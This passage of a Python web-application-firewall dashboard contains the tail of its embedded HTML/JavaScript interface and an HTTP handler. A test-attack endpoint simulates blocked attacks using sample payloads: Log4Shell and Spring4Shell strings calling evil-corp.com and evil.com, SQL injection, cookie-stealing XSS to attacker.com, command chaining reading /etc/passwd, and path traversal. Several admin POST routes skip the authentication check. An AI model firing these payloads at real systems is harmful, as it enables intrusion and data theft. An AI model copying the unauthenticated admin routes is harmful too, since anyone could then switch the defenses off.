            radarCtx.moveTo(0, 0);
            radarCtx.lineTo(r, 0);
            radarCtx.strokeStyle = '#00f3ff';
            radarCtx.lineWidth = 2;
            radarCtx.stroke();
            radarCtx.restore();

            // Render Radar Blips
            for (let i = radarBlips.length - 1; i >= 0; i--) {
                const b = radarBlips[i];
                radarCtx.beginPath();
                radarCtx.arc(b.x, b.y, b.size, 0, Math.PI * 2);
                radarCtx.fillStyle = b.color;
                radarCtx.shadowColor = b.color;
                radarCtx.shadowBlur = 10;
                radarCtx.fill();
                radarCtx.shadowBlur = 0;
                b.life -= 0.015;
                b.size = Math.max(2, b.size * 0.98);
                if (b.life <= 0) radarBlips.splice(i, 1);
            }

            radarAngle += 0.04;
            requestAnimationFrame(drawRadar);
        }
        drawRadar();

        function addRadarBlip(color = '#ff0055') {
            const r = (radarCanvas.width / 2 - 20) * Math.random();
            const theta = Math.random() * Math.PI * 2;
            radarBlips.push({
                x: radarCanvas.width / 2 + r * Math.cos(theta),
                y: radarCanvas.height / 2 + r * Math.sin(theta),
                size: 7,
                color: color,
                life: 1.0
            });
        }

        // Add log message to cyber terminal
        function logToTerminal(msg, color = '#a7f3d0') {
            const term = document.getElementById('terminalLog');
            const div = document.createElement('div');
            div.className = 'terminal-line';
            div.style.color = color;
            const timeStr = new Date().toLocaleTimeString();
            div.innerText = `[${timeStr}] ${msg}`;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }

        let lastBlockedCount = 0;

        // Fetch Live Stats & Telemetry
        async function fetchStats() {
            try {
                const res = await fetch('/__lightning_stats__');
                const data = await res.json();
                
                // Update Host Info
                if (data.host_info) {
                    document.getElementById('host-name').innerText = data.host_info.hostname || '127.0.0.1 (Localhost)';
                    document.getElementById('host-os').innerText = `${data.host_info.platform || 'OS'} • Python ${data.host_info.python_version || ''}`;
                    document.getElementById('host-threads').innerText = `Active Threads: ${data.host_info.threads_count || '6'} • Engine PID: ${data.host_info.pid || ''}`;
                }

                // Update Config targets
                if (data.config) {
                    document.getElementById('host-target-url').innerText = data.config.website_url || 'http://127.0.0.1:3000';
                    document.getElementById('host-waf-url').innerText = 'http://127.0.0.1:' + (data.config.shield_proxy_port || 8080);
                }

                // Update Metrics
                document.getElementById('metric-uptime').innerText = data.uptime || '00:00:00';
                document.getElementById('host-uptime-sub').innerText = 'System Uptime: ' + (data.uptime || '00:00:00');
                document.getElementById('metric-total').innerText = Number(data.total || 0).toLocaleString();
                document.getElementById('metric-blocked').innerText = Number(data.blocked || 0).toLocaleString();
                document.getElementById('metric-quarantine').innerText = data.quarantine_count || 0;
                document.getElementById('metric-dlp').innerText = data.dlp_count || 0;

                const ratio = data.total > 0 ? ((data.blocked / data.total) * 100).toFixed(1) : '0';
                document.getElementById('metric-block-rate').innerText = ratio + '% Interception Ratio';

                // Play sound if new attacks blocked
                if (data.blocked > lastBlockedCount && lastBlockedCount > 0) {
                    playSound('alarm');
                    addRadarBlip('#ff0055');
                }
                lastBlockedCount = data.blocked;

                // Update Categories
                const catBox = document.getElementById('categories-container');
                if (data.categories && Object.keys(data.categories).length > 0) {
                    let html = '';
                    const maxVal = Math.max(...Object.values(data.categories));
                    for (const [cat, count] of Object.entries(data.categories)) {
                        const pct = Math.max(10, (count / maxVal) * 100);
                        html += `
                        <div style="margin-bottom:12px;">
                            <div style="display:flex; justify-content:space-between; font-size:0.8rem; margin-bottom:4px; font-family:'Fira Code',monospace;">
                                <span>${cat}</span>
                                <span style="font-weight:700; color:var(--red);">${count}</span>
                            </div>
                            <div style="background:rgba(255,255,255,0.05); height:6px; border-radius:10px; overflow:hidden;">
                                <div style="width:${pct}%; height:100%; background:linear-gradient(90deg, #ff0055, #b026ff);"></div>
                            </div>
                        </div>`;
                    }
                    catBox.innerHTML = html;
                }

                // Update Threat Stream Table
                const threatTbody = document.getElementById('threat-tbody');
                if (data.recent_events && data.recent_events.length > 0) {
                    let rows = '';
                    for (const ev of data.recent_events.slice(-12).reverse()) {
                        rows += `
                        <tr>
                            <td style="color:var(--text-dim); font-size:0.75rem; font-family:'Fira Code',monospace;">${ev.time}</td>
                            <td><span class="ip-code">${ev.ip}</span></td>
                            <td><div class="uri-code">${ev.method} ${ev.path}</div></td>
                            <td><span class="badge badge-crit">${ev.category}</span></td>
                            <td><span class="badge badge-block">${ev.action}</span></td>
                        </tr>`;
                    }
                    threatTbody.innerHTML = rows;
                }

                // Update Quarantine Table
                const qTbody = document.getElementById('quarantine-tbody');
                if (data.quarantine_list && data.quarantine_list.length > 0) {
                    let qrows = '';
                    for (const q of data.quarantine_list) {
                        const mins = Math.floor(q.remaining_seconds / 60);
                        const secs = q.remaining_seconds % 60;
                        qrows += `
                        <tr>
                            <td><span class="ip-code">${q.ip}</span></td>
                            <td style="color:#fca5a5; font-size:0.8rem;">${q.reason}</td>
                            <td><span style="color:var(--yellow); font-weight:700; font-family:'Fira Code',monospace;">${mins}m ${secs}s</span></td>
                            <td><button class="unban-btn" onclick="unbanIP('${q.ip}')">Unban IP</button></td>
                        </tr>`;
                    }
                    qTbody.innerHTML = qrows;
                } else {
                    qTbody.innerHTML = '<tr><td colspan="4" style="color:var(--text-dim); text-align:center; padding:20px; font-family:\'Fira Code\',monospace;">No IPs currently in quarantine.</td></tr>';
                }

            } catch(e) {}
        }

        // Control Actions
        async function simulateAttack(type) {
            playSound('beep');
            logToTerminal(`Triggering test exploit vector [${type.toUpperCase()}]...`, '#ff0055');
            try {
                await fetch('/__lightning_test_attack__', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: type })
                });
                addRadarBlip('#ff0055');
                fetchStats();
            } catch(e) {}
        }

        async function triggerRadarSweep() {
            playSound('radar');
            logToTerminal("Executing Brutal Threat Radar 4-Sector Surface Sweep...", '#b026ff');
            try {
                await fetch('/__lightning_trigger_radar__', { method: 'POST' });
                for(let i=0; i<6; i++) setTimeout(() => addRadarBlip('#00ff9d'), i * 150);
            } catch(e) {}
        }

        async function syncThreatFeeds() {
            playSound('beep');
            logToTerminal("Syncing with Global Threat Feeds (FireHOL, Blocklist.de)...", '#00f3ff');
            try {
                await fetch('/__lightning_sync_threat_feeds__', { method: 'POST' });
                logToTerminal("✔ Threat Intelligence sync completed.", '#00ff9d');
            } catch(e) {}
        }

        async function unbanIP(ip) {
            playSound('beep');
            logToTerminal(`Removing IP ${ip} from quarantine blacklist...`, '#38bdf8');
            try {
                await fetch('/__lightning_unban__', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: ip })
                });
                fetchStats();
            } catch(e) {}
        }

        async function unbanAllIPs() {
            playSound('beep');
            logToTerminal("Flushing all active IP quarantine bans...", '#38bdf8');
            try {
                await fetch('/__lightning_unban__', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ unban_all: true })
                });
                fetchStats();
            } catch(e) {}
        }

        async function manualBanIP() {
            const ip = document.getElementById('manualBanIpInput').value.trim();
            if (!ip) return;
            playSound('alarm');
            logToTerminal(`Manual ban enforced on IP: ${ip}`, '#ff0055');
            try {
                await fetch('/__lightning_ban__', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: ip, reason: "Manual Operator Ban", duration: 86400 })
                });
                document.getElementById('manualBanIpInput').value = '';
                addRadarBlip('#ff0055');
                fetchStats();
            } catch(e) {}
        }

        async function changeTargetUrl() {
            const url = document.getElementById('newTargetInput').value.trim();
            if (!url) return;
            playSound('beep');
            logToTerminal(`Updating Protected Target Backend URL to: ${url}`, '#ffb700');
            try {
                await fetch('/__lightning_set_target__', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ website_url: url })
                });
                document.getElementById('newTargetInput').value = '';
                fetchStats();
            } catch(e) {}
        }

        function toggleLayer(layerName) {
            playSound('beep');
            const el = document.getElementById(`toggle-${layerName}`);
            const statusEl = document.getElementById(`status-${layerName}`);
            const isNowActive = !el.classList.contains('active');
            
            if (isNowActive) {
                el.classList.add('active');
                el.classList.remove('inactive');
                statusEl.innerText = 'ON';
                statusEl.className = 'toggle-status status-on';
                logToTerminal(`Defense Layer [${layerName.toUpperCase()}] enabled.`, '#00ff9d');
            } else {
                el.classList.remove('active');
                el.classList.add('inactive');
                statusEl.innerText = 'OFF';
                statusEl.className = 'toggle-status status-off';
                logToTerminal(`Defense Layer [${layerName.toUpperCase()}] disabled by operator.`, '#ff0055');
            }

            fetch('/__lightning_toggle_layer__', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ layer: layerName, active: isNowActive })
            }).catch(() => {});
        }

        async function clearAllLogs() {
            playSound('beep');
            try {
                await fetch('/__lightning_clear_logs__', { method: 'POST' });
                document.getElementById('threat-tbody').innerHTML = '<tr><td colspan="5" style="color:var(--text-dim); text-align:center; padding:30px; font-family:\'Fira Code\',monospace;">[⚡] Log stream flushed clean.</td></tr>';
                document.getElementById('terminalLog').innerHTML = '<div class="terminal-line" style="color:#00ff9d;">[+] Log stream cleared by operator.</div>';
                fetchStats();
            } catch(e) {}
        }

        setInterval(fetchStats, 1500);
        fetchStats();
    </script>
</body>
</html>
"""


class SOCHandler(BaseHTTPRequestHandler):
    notifier = None
    quarantine = None
    config = None
    recent_events = []
    dlp_count = 0
    layer_toggles = {
        "waf": True,
        "virtual_patch": True,
        "anti_bot": True,
        "dlp": True,
        "honeypot": True,
        "geo": True,
        "heuristic": True
    }

    def log_message(self, format, *args):
        return

    def _is_authenticated(self) -> bool:
        """Check if the request carries a valid session cookie."""
        cookie = self.headers.get("Cookie", "")
        token = extract_session_token(cookie)
        return verify_session(token) if token else False

    def _serve_login_page(self, error_msg: str = ""):
        """Serves the styled login page."""
        html = get_login_page_html().replace("__ERROR_PLACEHOLDER__", error_msg)
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/dashboard"):
            if not self._is_authenticated():
                self._serve_login_page()
                return
            body = SOC_HTML_TEMPLATE.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        elif self.path.startswith("/__lightning_stats__"):
            summary = self.notifier.stats.get_summary() if self.notifier else {}
            quarantined = self.quarantine.get_quarantine_list() if self.quarantine else []
            
            # Retrieve Host Environment Details
            try:
                hostname = socket.gethostname()
            except Exception:
                hostname = "127.0.0.1"

            host_info = {
                "hostname": hostname,
                "platform": f"{platform.system()} {platform.release()}",
                "python_version": platform.python_version(),
                "pid": os.getpid(),
                "threads_count": threading.active_count()
            }

            data = {
                "uptime": summary.get("uptime", "00:00:00"),
                "total": summary.get("total", 0),
                "blocked": summary.get("blocked", 0),
                "dlp_count": getattr(SOCHandler, "dlp_count", 0),
                "quarantine_count": len(quarantined),
                "quarantine_list": quarantined,
                "categories": summary.get("categories", {}),
                "recent_events": getattr(SOCHandler, "recent_events", []),
                "host_info": host_info,
                "layer_toggles": getattr(SOCHandler, "layer_toggles", {}),
                "config": {
                    "website_url": self.config.get("website_url", "http://127.0.0.1:3000") if self.config else "http://127.0.0.1:3000",
                    "shield_proxy_port": self.config.get("shield_proxy_port", 8080) if self.config else 8080
                }
            }
            body = json.dumps(data).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_len = int(self.headers.get("Content-Length", 0))
        post_body = self.rfile.read(content_len).decode("utf-8", errors="ignore") if content_len > 0 else ""

        if self.path.startswith("/__lightning_login__"):
            params = urllib.parse.parse_qs(post_body)
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            token = verify_login(username, password)
            if token:
                self.send_response(302)
                self.send_header("Set-Cookie", f"LIGHTNING_SESSION={token}; Path=/; HttpOnly; SameSite=Strict; Max-Age={3600*8}")
                self.send_header("Location", "/")
                self.end_headers()
            else:
                self._serve_login_page("Invalid username or password.")

        elif self.path.startswith("/__lightning_unban__"):
            try:
                data = json.loads(post_body) if post_body else {}
                if data.get("unban_all"):
                    if self.quarantine:
                        self.quarantine.quarantine_db.clear()
                else:
                    ip = data.get("ip")
                    if ip and self.quarantine:
                        self.quarantine.unban_ip(ip)
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        elif self.path.startswith("/__lightning_ban__"):
            try:
                data = json.loads(post_body) if post_body else {}
                ip = data.get("ip")
                reason = data.get("reason", "Manual Operator Ban")
                duration = data.get("duration", 86400)
                if ip and self.quarantine:
                    self.quarantine.ban_ip(ip, reason=reason, duration=duration)
                    SOCHandler.record_event(
                        ip=ip,
                        method="MANUAL",
                        path="/manual_operator_ban",
                        category="Operator Action",
                        action="QUARANTINED (86400s)"
                    )
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"banned"}')

        elif self.path.startswith("/__lightning_set_target__"):
            try:
                data = json.loads(post_body) if post_body else {}
                new_url = data.get("website_url")
                if new_url and self.config is not None:
                    self.config["website_url"] = new_url
                    from config import save_config
                    save_config(self.config)
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"updated"}')

        elif self.path.startswith("/__lightning_toggle_layer__"):
            try:
                data = json.loads(post_body) if post_body else {}
                layer = data.get("layer")
                active = data.get("active", True)
                if layer:
                    SOCHandler.layer_toggles[layer] = active
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"toggled"}')

        elif self.path.startswith("/__lightning_clear_logs__"):
            SOCHandler.recent_events.clear()
            if self.notifier and hasattr(self.notifier, "stats"):
                self.notifier.stats.blocked_count = 0
                self.notifier.stats.categories.clear()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"cleared"}')

        elif self.path.startswith("/__lightning_sync_threat_feeds__"):
            try:
                from core.threat_feeds import ThreatIntelligenceFeedManager
                from core.persistence import PersistenceEngine
                pe = PersistenceEngine()
                tf = ThreatIntelligenceFeedManager(persistence=pe)
                threading.Thread(target=tf.refresh_all_feeds, daemon=True).start()
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"syncing"}')

        elif self.path.startswith("/__lightning_trigger_radar__"):
            try:
                from core.radar import BrutalContinuousRadar
                target_url = self.config.get("website_url", "http://127.0.0.1:3000") if self.config else "http://127.0.0.1:3000"
                radar = BrutalContinuousRadar(target_url=target_url, notifier=self.notifier)
                threading.Thread(target=radar.run_radar_sweep, daemon=True).start()
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"radar_triggered"}')

        elif self.path.startswith("/__lightning_test_attack__"):
            attack_type = "random"
            try:
                data = json.loads(post_body) if post_body else {}
                attack_type = data.get("type", "random")
            except Exception:
                pass

            test_attacks = {
                "log4shell": {
                    "ip": "185.220.101.44",
                    "path": "/login?api=${jndi:ldap://evil-corp.com:1389/Exploit}",
                    "cat": "Zero-Day Exploit (Log4Shell)",
                    "desc": "CVE-2021-44228 JNDI injection intercepted"
                },
                "spring4shell": {
                    "ip": "45.154.255.89",
                    "path": "/helloworld?class.module.classLoader.URLs[0]=jar:http://evil.com/shell.jar!/",
                    "cat": "Zero-Day Exploit (Spring4Shell)",
                    "desc": "CVE-2022-22965 ClassLoader injection dropped"
                },
                "sqli": {
                    "ip": "194.26.29.112",
                    "path": "/api/users?search=admin' UNION SELECT 1,password,email FROM users--",
                    "cat": "SQL Injection (SQLi)",
                    "desc": "UNION SELECT extraction exploit dropped"
                },
                "xss": {
                    "ip": "103.145.13.20",
                    "path": "/search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>",
                    "cat": "Cross-Site Scripting (XSS)",
                    "desc": "Reflected script injection neutralized"
                },
                "rce": {
                    "ip": "91.240.118.15",
                    "path": "/tools/ping?ip=127.0.0.1; powershell whoami; cat /etc/passwd",
                    "cat": "Remote Code Execution (RCE)",
                    "desc": "Command chaining attempt blocked"
                },
                "webshell": {
                    "ip": "193.106.191.24",
                    "path": "/uploads/avatar.php.jpg (Double Extension Webshell)",
                    "cat": "Malware & Web Shell Upload",
                    "desc": "Disguised executable PHP script blocked"
                },
                "honeypot": {
                    "ip": "89.248.165.77",
                    "path": "/admin_login.php (Decoy Trap)",
                    "cat": "Honeypot Decoy Trap",
                    "desc": "Scanner probed fake administrative gateway"
                },
                "lfi": {
                    "ip": "198.98.56.2",
                    "path": "/download?file=../../../../etc/passwd",
                    "cat": "Path Traversal / LFI",
                    "desc": "Sensitive operating system file traversal dropped"
                }
            }

            selected = test_attacks.get(attack_type)
            if not selected:
                import random
                selected = random.choice(list(test_attacks.values()))

            SOCHandler.record_event(
                ip=selected["ip"],
                method="GET",
                path=selected["path"],
                category=selected["cat"],
                action="BLOCKED (403 Forbidden)"
            )

            if self.notifier:
                self.notifier.alert_threat(
                    ip=selected["ip"],
                    method="GET",
                    path=selected["path"],
                    category=selected["cat"],
                    description=selected["desc"],
                    severity="CRITICAL",
                    snippet=selected["path"][:50],
                    action="BLOCKED (403 Forbidden)"
                )
            if self.quarantine:
                self.quarantine.ban_ip(selected["ip"], reason=selected["cat"], duration=300)

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"simulated"}')
        else:
            self.send_response(404)
            self.end_headers()

    @classmethod
    def record_event(cls, ip: str, method: str, path: str, category: str, action: str):
        event = {
            "time": time.strftime("%H:%M:%S"),
            "ip": ip,
            "method": method,
            "path": path,
            "category": category,
            "action": action
        }
        cls.recent_events.append(event)
        if len(cls.recent_events) > 80:
            cls.recent_events.pop(0)


def run_soc_dashboard_server(port: int = 8888, notifier=None, quarantine=None, config=None):
    """Launches the futuristic Web SOC Dashboard on the specified port."""
    SOCHandler.notifier = notifier
    SOCHandler.quarantine = quarantine
    SOCHandler.config = config
    SOCHandler.recent_events = []
    
    try:
        server = HTTPServer(("0.0.0.0", port), SOCHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True, name="SOC-Dashboard")
        t.start()
        return server
    except Exception:
        return None
